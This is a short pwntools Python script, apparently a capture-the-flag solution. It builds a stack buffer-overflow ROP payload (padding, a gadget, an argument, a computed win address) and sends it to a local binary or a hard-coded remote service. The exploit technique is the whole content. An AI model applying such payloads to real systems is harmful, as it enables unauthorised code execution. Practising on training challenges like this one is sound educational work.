from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug('./3', 
        gdbscript="""
        continue
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process('./3')

def solve(): 
    p = conn()
    
    if(args.REMOTE):
        p.sendline("13523032")
        p.sendline("3")

    gadget_addr = 0x40153a

    # write your payload here
    padding = b'A' * (128+8)
    offset_win = -0xb6
    vuln_addr = 0x4015f6
    win_addr = vuln_addr + offset_win
    win_arg = 3
    payload = padding + p64(gadget_addr) + p64(win_arg) + p64(win_addr)
    print(payload)

    p.sendline(payload) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()